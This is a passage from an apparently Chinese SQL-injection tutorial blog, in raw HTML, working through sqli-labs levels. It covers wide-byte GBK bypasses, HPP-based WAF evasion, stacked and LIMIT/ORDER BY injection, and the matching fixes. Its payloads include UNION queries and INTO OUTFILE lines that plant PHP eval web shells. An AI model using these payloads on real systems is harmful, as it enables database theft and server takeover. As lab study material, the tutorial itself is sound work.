class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqllabs less11  - less14</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 <code>gbk</code></p>\n<p>一个 <code>gbk</code>  编码汉字，占用 2 个字节。一个 <code>utf-8</code>  编码的汉字，占用 3 个字节。</p>\n<p>假设我们有以下代码，并且我们的 <code>magic_quotes_gpc</code>  是关闭的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class=\"line\">$conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;toor!@#$&#x27;) or die(&#x27;bad!&#x27;);</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_select_db(&#x27;test&#x27;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class=\"line\">//执行sql语句</span><br><span class=\"line\">$id = isset($_GET[&#x27;id&#x27;]) ? addslashes($_GET[&#x27;id&#x27;]) : 1;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM news WHERE tid=&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class=\"line\">$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class=\"line\">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class=\"line\">echo &quot;&lt;h2&gt;&#123;$row[&#x27;title&#x27;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&#x27;content&#x27;]&#125;&lt;p&gt;\\n&quot;;</span><br><span class=\"line\">mysql_free_result($result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>如果我们想注入，那么必须绕过 <code>addslashes</code>  的过滤，我们可以有两种思路：</p>\n<blockquote>\n<p>1. 想办法给 <code>\\</code>  前面再加一个 <code>\\</code> （或单数个即可），变成 <code>\\\\'</code> ，这样 <code>\\</code>  被转义了， <code>'</code>  逃出了限制</p>\n<p>2. 想办法把 <code>\\</code>  弄没有。</p>\n</blockquote>\n<p>我们先说把 <code>\\</code>  弄没有的情况</p>\n<p>mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 <code>%df'</code>  看会怎样：</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111ß\\''' at line 1</code></p>\n<p>此时出现报错，说明存在注入</p>\n<p>这就是 mysql 的特性，因为 <code>gbk</code>  是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code>  和后面的 <code>addslash</code>  加的 <code>\\</code>  也就是 <code>%5c</code>  变成了一个汉字 <code>運</code> ，而 <code>'</code>  逃逸了出来。</p>\n<p>因为两个字节代表一个汉字，所以我们可以试试 <code>%df%df%27</code> ：</p>\n<p>此时不报错了， <code>%df%df</code>  拼成了一个汉字， <code>%5c%27</code>  因为 <code>27</code>  不大于 128，不构成汉字。所以根据这个特性，我们用 <code>1%a1'</code>  也可以。</p>\n<p><code>%a1%5c</code>  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 <code>%27</code>  逃逸了出来。</p>\n<p>但如果我们把 gbk 换成 gb2312，我们的 <code>%df%5c%27</code>  又不能注入了</p>\n<p>这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿</p>\n<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案1</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_real_escape_string</span><br></pre></td></tr></table></figure>\n<p>第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案2</span><br><span class=\"line\">//只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class=\"line\">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>\n<p>我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>\n<p>接下来是双重转义的情况 —iconv 导致的致命后果</p>\n<p>(划重点，好好看，后面 file include 中会考这个函数)</p>\n<p>有些 cms 会使用如下字符集转换函数防止乱码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>当我们输入 <code>錦'</code>  时，他又报错了，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code></p>\n<p>当他从 utf8 转成 gbk 时，变成了 <code>%e5%5c%27</code> ，这时多管闲事的 addslashes 又送来了一个 <code>\\</code> ，变成了 <code>%e5%5c%5c%27</code> ，两个 5c 形成了双重转义，对 <code>'</code>  的转义失效，注入产生</p>\n<p>如果我们此时从 gbk 转为 utf8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>我们再次输入 <code>%aa'</code> ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 <code>\\</code>  前面的字符是奇数， <code>\\</code>  就会被吞掉， <code>'</code>  逃逸</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错：</p>\n<p>而 <code>\\</code>  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \\</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s\">浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)</span></p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>sqllabs less 29:</p>\n<p>在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染</p>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;id=-2%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"通过hppphp绕过贷齐乐waf\"><a class=\"markdownIt-Anchor\" href=\"#通过hppphp绕过贷齐乐waf\">#</a> 通过 HPP+PHP 绕过贷齐乐 waf</h6>\n<p>此处的 waf 会经过两层过滤，第一层过滤</p>\n<p>/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class sqlin &#123;</span><br><span class=\"line\">\tfunction dowith_sql($str) &#123;</span><br><span class=\"line\">\t\t$check= eregi(&#x27;select|insert|update|delete|\\&#x27;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile&#x27;, $str);</span><br><span class=\"line\">\t\tif($check)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\techo &quot;非法字符!&quot;;</span><br><span class=\"line\">\t\t\texit();</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>第二层过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* 检查和转义字符 */</span><br><span class=\"line\">function safe_str($str)&#123;</span><br><span class=\"line\">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">        if( is_array($str) ) &#123;</span><br><span class=\"line\">            foreach($str as $key =&gt; $value) &#123;</span><br><span class=\"line\">                $str[$key] = safe_str($value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $str = addslashes($str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function dhtmlspecialchars($string) &#123;</span><br><span class=\"line\">    if(is_array($string)) &#123;</span><br><span class=\"line\">        foreach($string as $key =&gt; $val) &#123;</span><br><span class=\"line\">            $string[$key] = dhtmlspecialchars($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $string = str_replace(array(&#x27;&amp;&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;), array(&#x27;&amp;amp;&#x27;, &#x27;&amp;quot;&#x27;, &#x27;&amp;lt;&#x27;, &#x27;&amp;gt;&#x27;,&#x27;（&#x27;,&#x27;）&#x27;), $string);</span><br><span class=\"line\">        if(strpos($string, &#x27;&amp;amp;#&#x27;) !== false) &#123;</span><br><span class=\"line\">            $string = preg_replace(&#x27;/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;, &#x27;&amp;\\\\1&#x27;, $string);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $string;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此该系统对于输入处理的过程如下</p>\n<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>\n<p>但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$request_uri = explode(&quot;?&quot;, $_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class=\"line\">if (isset($request_uri[1])) &#123;</span><br><span class=\"line\">\t$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class=\"line\">\tforeach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$_value = explode(&quot;=&quot;, $value);</span><br><span class=\"line\">\t\tif (isset($_value[1])) &#123;</span><br><span class=\"line\">\t\t\t$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义</p>\n<p>当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf</p>\n<p>但 php 的另一个特性：</p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>也就是说，php 会认为 i_d 和 i.d 是同一个参数</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>因此在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>如果我们要利用这个特性，那么必须满足几点：</p>\n<p>1. 有注入点</p>\n<p>2. 注入点可控变量需要获取自 $_REQUEST</p>\n<p>3. 变量的名字必须包含下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static function GetOne($data = array())&#123;</span><br><span class=\"line\">    global $mysql;</span><br><span class=\"line\">    $user_id = isset($data[&#x27;user_id&#x27;])?$data[&#x27;user_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $username = isset($data[&#x27;username&#x27;])?$data[&#x27;username&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $password = isset($data[&#x27;password&#x27;])?$data[&#x27;password&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $email = isset($data[&#x27;email&#x27;])?$data[&#x27;email&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $type_id = isset($data[&#x27;type_id&#x27;])?$data[&#x27;type_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class=\"line\">         `user_id` int(11) NOT NULL DEFAULT &#x27;0&#x27;)&quot;;</span><br><span class=\"line\">    $mysql -&gt;db_query($sql);</span><br></pre></td></tr></table></figure>\n<p>以上代码满足了上面的三个要求</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//由于=被过滤，需要使用like，同时对数据库进行16进制编码</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h5 id=\"order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by注入\">#</a> order by 注入</h5>\n<p>order by 是 mysql 中对查询数据进行排序的方法， 使用示例</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span 